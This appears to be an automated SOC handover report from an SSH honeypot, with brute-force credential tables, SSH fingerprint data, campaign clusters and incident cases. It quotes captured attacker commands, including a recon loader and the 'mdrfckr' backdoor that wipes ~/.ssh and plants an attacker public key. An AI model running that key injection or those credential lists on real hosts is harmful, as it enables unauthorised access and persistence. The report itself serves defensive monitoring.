# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-05 |
| **Generated At** | 2026-07-05T13:49:25Z |
| **Shift Time** | 13:49 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **980** |
| Confirmed Threats | **958** |
| False Positives Filtered | **22** (2.2%) |
| Unique Attacker IPs | **68** |
| Countries of Origin | **21** |
| High Severity Cases | **160** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **820** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **182** |
| Unique Credential Pairs | **127** |
| Unique Usernames | **21** |
| Unique Passwords | **99** |
| Successful Auth Pairs | **162** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 102 |
| `admin` | 26 |
| `345gs5662d34` | 13 |
| `support` | 9 |
| `ubuntu` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `support` | 9 |
| `admin` | 9 |
| `smo@@kkklss` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `support` | `support` | 9 |
| `admin` | `admin` | 6 |
| `root` | `smo@@kkklss` | 5 |
| `root` | `3245gs5662d34` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1` | `91.92.40.6` | 2026-07-05T08:56:55 |
| `root` | `12` | `91.92.40.6` | 2026-07-05T08:58:07 |
| `root` | `123` | `91.92.40.6` | 2026-07-05T08:59:36 |
| `root` | `passwOrd` | `45.198.224.120` | 2026-07-05T09:00:38 |
| `root` | `1234` | `91.92.40.6` | 2026-07-05T09:01:08 |
| `root` | `12345` | `91.92.40.6` | 2026-07-05T09:02:37 |
| `root` | `1234567` | `91.92.40.6` | 2026-07-05T09:05:33 |
| `root` | `12345678` | `91.92.40.6` | 2026-07-05T09:07:00 |
| `root` | `123456789` | `91.92.40.6` | 2026-07-05T09:08:28 |
| `root` | `1234567890` | `91.92.40.6` | 2026-07-05T09:09:56 |
| `odoo` | `odoo1234` | `10.0.0.73` | 2026-07-05T09:11:10 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-05T09:11:15 |
| `odoo` | `3245gs5662d34` | `10.0.0.73` | 2026-07-05T09:11:17 |
| `root` | `123qwe` | `91.92.40.6` | 2026-07-05T09:11:25 |
| `root` | `cambiami` | `45.198.224.120` | 2026-07-05T09:11:48 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-05T09:12:23 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-05T09:12:23 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-05T09:12:32 |
| `root` | `123qwerty` | `91.92.40.6` | 2026-07-05T09:12:54 |
| `support` | `support` | `176.53.159.196` | 2026-07-05T09:13:46 |
| `root` | `21` | `91.92.40.6` | 2026-07-05T09:14:24 |
| `support` | `support` | `10.0.0.73` | 2026-07-05T09:15:05 |
| `root` | `321` | `91.92.40.6` | 2026-07-05T09:15:54 |
| `root` | `4321` | `91.92.40.6` | 2026-07-05T09:17:24 |
| `root` | `54321` | `91.92.40.6` | 2026-07-05T09:18:56 |
| `root` | `qvod_123` | `185.242.3.195` | 2026-07-05T09:19:45 |
| `root` | `654321` | `91.92.40.6` | 2026-07-05T09:20:26 |
| `root` | `P4ssw0rd` | `91.92.40.6` | 2026-07-05T09:21:52 |
| `root` | `TOOR123` | `45.198.224.120` | 2026-07-05T09:23:01 |
| `root` | `P4ssword` | `91.92.40.6` | 2026-07-05T09:23:19 |
| `root` | `qvod_123` | `10.0.0.73` | 2026-07-05T09:23:36 |
| `root` | `P@ssw0rd` | `91.92.40.6` | 2026-07-05T09:24:47 |
| `root` | `Passw0rd` | `91.92.40.6` | 2026-07-05T09:26:15 |
| `root` | `p4ssword` | `91.92.40.6` | 2026-07-05T09:27:42 |
| `root` | `p@ssw0rd` | `91.92.40.6` | 2026-07-05T09:29:10 |
| `root` | `Password789` | `45.198.224.120` | 2026-07-05T09:34:18 |
| `root` | `﻿------fuck------` | `120.193.9.168` | 2026-07-05T09:36:03 |
| `root` | `Passwd@123456` | `45.198.224.120` | 2026-07-05T09:45:45 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-05T09:54:06 |
| `root` | `Rjkj@free7248#8` | `45.198.224.120` | 2026-07-05T09:57:01 |
| `root` | `zhou1234` | `10.0.0.73` | 2026-07-05T09:58:23 |
| `root` | `P@ssword2019` | `45.198.224.120` | 2026-07-05T10:08:27 |
| `netika` | `netika` | `185.242.3.195` | 2026-07-05T10:15:26 |
| `root` | `qwe` | `45.198.224.120` | 2026-07-05T10:19:30 |
| `root` | `Password123$` | `10.0.0.73` | 2026-07-05T10:29:44 |
| `ubuntu` | `aaaaaa` | `45.198.224.120` | 2026-07-05T10:30:46 |
| `root` | `angelqwe123` | `45.198.224.120` | 2026-07-05T10:41:59 |
| `root` | `!root` | `195.178.110.228` | 2026-07-05T10:42:42 |
| `root` | `111111` | `195.178.110.228` | 2026-07-05T10:44:21 |
| `root` | `123123` | `195.178.110.228` | 2026-07-05T10:46:12 |
| `root` | `1234` | `195.178.110.228` | 2026-07-05T10:47:58 |
| `root` | `12345` | `195.178.110.228` | 2026-07-05T10:49:40 |
| `ts` | `teamspeak` | `45.198.224.120` | 2026-07-05T10:52:53 |
| `root` | `12345678` | `195.178.110.228` | 2026-07-05T10:52:53 |
| `root` | `123456789` | `195.178.110.228` | 2026-07-05T10:54:26 |
| `netika` | `netika` | `10.0.0.73` | 2026-07-05T10:55:50 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-07-05T10:55:53 |
| `root` | `Password1` | `195.178.110.228` | 2026-07-05T10:57:17 |
| `root` | `Root123` | `195.178.110.228` | 2026-07-05T10:58:43 |
| `root` | `admin` | `195.178.110.228` | 2026-07-05T11:00:18 |
| `root` | `Soccer` | `197.225.146.23` | 2026-07-05T11:00:43 |
| `345gs5662d34` | `345gs5662d34` | `197.225.146.23` | 2026-07-05T11:00:47 |
| `root` | `3245gs5662d34` | `197.225.146.23` | 2026-07-05T11:00:49 |
| `root` | `admin123` | `195.178.110.228` | 2026-07-05T11:01:56 |
| `root` | `alpine` | `195.178.110.228` | 2026-07-05T11:03:31 |
| `root` | `12W34R56Y` | `217.60.3.128` | 2026-07-05T11:03:40 |
| `345gs5662d34` | `345gs5662d34` | `217.60.3.128` | 2026-07-05T11:03:42 |
| `root` | `3245gs5662d34` | `217.60.3.128` | 2026-07-05T11:03:43 |
| `root` | `P@ssw0rd2016` | `45.198.224.120` | 2026-07-05T11:03:56 |
| `root` | `changeme` | `195.178.110.228` | 2026-07-05T11:05:05 |
| `root` | `default` | `195.178.110.228` | 2026-07-05T11:06:37 |
| `root` | `letmein` | `195.178.110.228` | 2026-07-05T11:08:17 |
| `root` | `passw0rd` | `195.178.110.228` | 2026-07-05T11:09:54 |
| `root` | `password` | `195.178.110.228` | 2026-07-05T11:11:21 |
| `root` | `qwerty` | `195.178.110.228` | 2026-07-05T11:12:52 |
| `23` | `root` | `83.168.69.141` | 2026-07-05T11:13:04 |
| `root` | `r00t` | `195.178.110.228` | 2026-07-05T11:14:22 |
| `23` | `admin` | `83.168.69.141` | 2026-07-05T11:14:47 |
| `root` | `qwer!@#123` | `45.198.224.120` | 2026-07-05T11:15:01 |
| `root` | `espana` | `223.223.199.221` | 2026-07-05T11:15:38 |
| `root` | `root123` | `195.178.110.228` | 2026-07-05T11:17:11 |
| `root` | `root@123` | `195.178.110.228` | 2026-07-05T11:18:38 |
| `root` | `rootme` | `195.178.110.228` | 2026-07-05T11:20:07 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `180.95.231.27` | 2026-07-05T11:20:20 |
| `root` | `system` | `195.178.110.228` | 2026-07-05T11:21:42 |
| `root` | `toor` | `195.178.110.228` | 2026-07-05T11:23:13 |
| `root` | `welcome` | `195.178.110.228` | 2026-07-05T11:24:42 |
| `root` | `123@@@` | `140.245.50.204` | 2026-07-05T11:25:24 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-07-05T11:25:25 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-07-05T11:25:30 |
| `root` | `P@ssw0rd*()123` | `45.198.224.120` | 2026-07-05T11:26:00 |
| `admin` | `111111` | `195.178.110.228` | 2026-07-05T11:26:17 |
| `admin` | `123123` | `195.178.110.228` | 2026-07-05T11:27:51 |
| `admin` | `1234` | `195.178.110.228` | 2026-07-05T11:29:20 |
| `admin` | `12345` | `195.178.110.228` | 2026-07-05T11:30:49 |
| `admin` | `123456` | `195.178.110.228` | 2026-07-05T11:32:14 |
| `admin` | `12345678` | `195.178.110.228` | 2026-07-05T11:33:44 |
| `admin` | `CalVxePV1!` | `141.11.88.137` | 2026-07-05T11:34:42 |
| `admin` | `123456789` | `195.178.110.228` | 2026-07-05T11:35:13 |
| `admin` | `Admin123` | `195.178.110.228` | 2026-07-05T11:36:41 |
| `root` | `1q2w3e4r5t6y` | `45.198.224.120` | 2026-07-05T11:37:25 |
| `admin` | `Administrator` | `195.178.110.228` | 2026-07-05T11:38:07 |
| `admin` | `P@ssw0rd` | `195.178.110.228` | 2026-07-05T11:39:35 |
| `admin` | `access` | `195.178.110.228` | 2026-07-05T11:41:03 |
| `admin` | `admin` | `195.178.110.228` | 2026-07-05T11:42:34 |
| `admin` | `admin123` | `195.178.110.228` | 2026-07-05T11:44:05 |
| `admin` | `admin@123` | `195.178.110.228` | 2026-07-05T11:45:38 |
| `admin` | `adminadmin` | `195.178.110.228` | 2026-07-05T11:47:09 |
| `root` | `zxcv1234` | `185.242.3.195` | 2026-07-05T11:47:30 |
| `admin` | `letmein` | `195.178.110.228` | 2026-07-05T11:48:38 |
| `ubuntu` | `password1234567` | `45.198.224.120` | 2026-07-05T11:48:39 |
| `admin` | `passw0rd` | `195.178.110.228` | 2026-07-05T11:50:07 |
| `deployer` | `admin` | `211.251.245.88` | 2026-07-05T11:50:10 |
| `345gs5662d34` | `345gs5662d34` | `211.251.245.88` | 2026-07-05T11:50:14 |
| `deployer` | `3245gs5662d34` | `211.251.245.88` | 2026-07-05T11:50:15 |
| `root` | `aqswde` | `189.204.230.91` | 2026-07-05T11:51:15 |
| `345gs5662d34` | `345gs5662d34` | `189.204.230.91` | 2026-07-05T11:51:17 |
| `root` | `3245gs5662d34` | `189.204.230.91` | 2026-07-05T11:51:18 |
| `admin` | `password` | `195.178.110.228` | 2026-07-05T11:51:31 |
| `admin` | `password1` | `195.178.110.228` | 2026-07-05T11:52:55 |
| `admin` | `admin` | `47.80.29.108` | 2026-07-05T11:54:03 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-05T11:54:04 |
| `admin` | `qwerty` | `195.178.110.228` | 2026-07-05T11:54:19 |
| `ubuntu` | `!@#QWE123qwe` | `181.0.214.136` | 2026-07-05T11:57:26 |
| `345gs5662d34` | `345gs5662d34` | `181.0.214.136` | 2026-07-05T11:57:38 |
| `ubuntu` | `3245gs5662d34` | `181.0.214.136` | 2026-07-05T11:57:42 |
| `root` | `123ASDasd` | `175.119.225.68` | 2026-07-05T11:58:54 |
| `345gs5662d34` | `345gs5662d34` | `175.119.225.68` | 2026-07-05T11:58:57 |
| `root` | `3245gs5662d34` | `175.119.225.68` | 2026-07-05T11:58:58 |
| `root` | `QAZ@123cde` | `45.198.224.120` | 2026-07-05T12:00:03 |
| `ubuntu` | `!@#QWE123qwe` | `175.103.54.172` | 2026-07-05T12:02:31 |
| `345gs5662d34` | `345gs5662d34` | `175.103.54.172` | 2026-07-05T12:02:35 |
| `ubuntu` | `3245gs5662d34` | `175.103.54.172` | 2026-07-05T12:02:37 |
| `ec2-user` | `ec2-user@2024` | `209.99.190.200` | 2026-07-05T12:04:30 |
| `345gs5662d34` | `345gs5662d34` | `209.99.190.200` | 2026-07-05T12:04:33 |
| `ec2-user` | `3245gs5662d34` | `209.99.190.200` | 2026-07-05T12:04:33 |
| `es1` | `123456` | `14.103.123.75` | 2026-07-05T12:06:08 |
| `root` | `1qaz2wsx123` | `129.121.42.131` | 2026-07-05T12:07:12 |
| `345gs5662d34` | `345gs5662d34` | `129.121.42.131` | 2026-07-05T12:07:15 |
| `root` | `3245gs5662d34` | `129.121.42.131` | 2026-07-05T12:07:16 |
| `haowang` | `haowang` | `45.198.224.120` | 2026-07-05T12:11:03 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-05T12:14:05 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-05T12:14:05 |
| `admin` | `admin` | `152.32.174.171` | 2026-07-05T12:14:51 |
| `root` | `qazxsw!@#` | `45.198.224.120` | 2026-07-05T12:22:36 |
| `default` | `` | `10.0.0.73` | 2026-07-05T12:24:47 |
| `root` | `zxcv1234` | `10.0.0.73` | 2026-07-05T12:28:24 |
| `postgres` | `vincent` | `10.0.0.73` | 2026-07-05T12:32:20 |
| `username` | `12345` | `10.0.0.73` | 2026-07-05T12:33:09 |
| `liuyumeng` | `liuyumeng` | `45.198.224.120` | 2026-07-05T12:34:17 |
| `root` | `---fuck_you----` | `115.190.126.161` | 2026-07-05T12:39:12 |
| `ftp-user` | `ftpuser` | `103.69.96.120` | 2026-07-05T12:41:27 |
| `345gs5662d34` | `345gs5662d34` | `103.69.96.120` | 2026-07-05T12:41:31 |
| `ftp-user` | `3245gs5662d34` | `103.69.96.120` | 2026-07-05T12:41:33 |
| `vpn` | `123` | `103.20.122.54` | 2026-07-05T12:42:15 |
| `345gs5662d34` | `345gs5662d34` | `103.20.122.54` | 2026-07-05T12:42:19 |
| `vpn` | `3245gs5662d34` | `103.20.122.54` | 2026-07-05T12:42:21 |
| `ts3` | `changeme` | `51.75.141.245` | 2026-07-05T12:43:03 |
| `345gs5662d34` | `345gs5662d34` | `51.75.141.245` | 2026-07-05T12:43:05 |
| `ts3` | `3245gs5662d34` | `51.75.141.245` | 2026-07-05T12:43:06 |
| `root` | `Qwerty12345` | `45.198.224.120` | 2026-07-05T12:45:52 |
| `root` | `﻿------fuck------` | `106.12.29.168` | 2026-07-05T12:47:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **980** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 110 |
| libssh | 50 |
| Paramiko (Python) | 13 |
| PuTTY | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 71 | 2 |
| `f555226df196...` | Mirai/variant | 32 | 12 |
| `16443846184e...` | Generic scanner | 26 | 2 |
| `a2de0f306611...` | Mirai/variant | 13 | 3 |
| `03a80b21afa8...` | Modern SSH client | 6 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 71 | 2 | Mirai/variant |
| `f555226df196...` | libssh | 32 | 12 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 26 | 2 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 13 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 10 | 2 | — |
| `03a80b21afa8...` | libssh | 6 | 2 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 4 | 4 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 68 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 12 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`, `91.92.40.6`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `141.11.88.137`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.69.96.120`, `51.75.141.245`, `175.119.225.68`, `211.251.245.88`, `189.204.230.91`, `197.225.146.23`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **68** |
| Unique ASNs | **51** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS209334` | Modat B.V. | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (159)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8c964cb0770d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 08:56 |
| **Last Seen** | 2026-07-05 08:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:56:54` | `cowrie.session.connect` |
| `2026-07-05 08:56:54` | `cowrie.client.version` |
| `2026-07-05 08:56:54` | `cowrie.client.kex` |
| `2026-07-05 08:56:55` | `cowrie.login.success` |
| `2026-07-05 08:56:56` | `cowrie.session.params` |
| `2026-07-05 08:56:56` | `cowrie.command.input` |
| `2026-07-05 08:56:56` | `cowrie.command.input` |
| `2026-07-05 08:56:56` | `cowrie.command.input` |
| `2026-07-05 08:56:56` | `cowrie.command.input` |
| `2026-07-05 08:56:56` | `cowrie.command.input` |
| `2026-07-05 08:56:56` | `cowrie.command.success` |
| `2026-07-05 08:56:56` | `cowrie.command.input` |
| `2026-07-05 08:56:56` | `cowrie.command.input` |
| `2026-07-05 08:56:56` | `cowrie.command.input` |
| `2026-07-05 08:56:56` | `cowrie.command.input` |
| `2026-07-05 08:56:57` | `cowrie.log.closed` |
| `2026-07-05 08:56:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5edc4f37bc64

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 08:58 |
| **Last Seen** | 2026-07-05 08:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:58:04` | `cowrie.session.connect` |
| `2026-07-05 08:58:04` | `cowrie.client.version` |
| `2026-07-05 08:58:04` | `cowrie.client.kex` |
| `2026-07-05 08:58:07` | `cowrie.login.success` |
| `2026-07-05 08:58:09` | `cowrie.session.params` |
| `2026-07-05 08:58:09` | `cowrie.command.input` |
| `2026-07-05 08:58:09` | `cowrie.command.input` |
| `2026-07-05 08:58:09` | `cowrie.command.input` |
| `2026-07-05 08:58:09` | `cowrie.command.input` |
| `2026-07-05 08:58:09` | `cowrie.command.input` |
| `2026-07-05 08:58:09` | `cowrie.command.success` |
| `2026-07-05 08:58:09` | `cowrie.command.input` |
| `2026-07-05 08:58:09` | `cowrie.command.input` |
| `2026-07-05 08:58:09` | `cowrie.command.input` |
| `2026-07-05 08:58:09` | `cowrie.command.input` |
| `2026-07-05 08:58:09` | `cowrie.log.closed` |
| `2026-07-05 08:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fa67cbff9f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 08:59 |
| **Last Seen** | 2026-07-05 08:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 08:59:33` | `cowrie.session.connect` |
| `2026-07-05 08:59:34` | `cowrie.client.version` |
| `2026-07-05 08:59:34` | `cowrie.client.kex` |
| `2026-07-05 08:59:36` | `cowrie.login.success` |
| `2026-07-05 08:59:38` | `cowrie.session.params` |
| `2026-07-05 08:59:38` | `cowrie.command.input` |
| `2026-07-05 08:59:38` | `cowrie.command.input` |
| `2026-07-05 08:59:38` | `cowrie.command.input` |
| `2026-07-05 08:59:38` | `cowrie.command.input` |
| `2026-07-05 08:59:38` | `cowrie.command.input` |
| `2026-07-05 08:59:38` | `cowrie.command.success` |
| `2026-07-05 08:59:38` | `cowrie.command.input` |
| `2026-07-05 08:59:38` | `cowrie.command.input` |
| `2026-07-05 08:59:38` | `cowrie.command.input` |
| `2026-07-05 08:59:38` | `cowrie.command.input` |
| `2026-07-05 08:59:39` | `cowrie.log.closed` |
| `2026-07-05 08:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f71b7040241f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 09:00 |
| **Last Seen** | 2026-07-05 09:00 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:00:30` | `cowrie.session.connect` |
| `2026-07-05 09:00:31` | `cowrie.client.version` |
| `2026-07-05 09:00:31` | `cowrie.client.kex` |
| `2026-07-05 09:00:38` | `cowrie.login.success` |
| `2026-07-05 09:00:41` | `cowrie.session.params` |
| `2026-07-05 09:00:41` | `cowrie.command.input` |
| `2026-07-05 09:00:42` | `cowrie.log.closed` |
| `2026-07-05 09:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5596d7044358

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-05 09:01 |
| **Last Seen** | 2026-07-05 09:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 09:01:05` | `cowrie.session.connect` |
| `2026-07-05 09:01:06` | `cowrie.client.version` |
| `2026-07-05 09:01:06` | `cowrie.client.kex` |
| `2026-07-05 09:01:08` | `cowrie.login.success` |
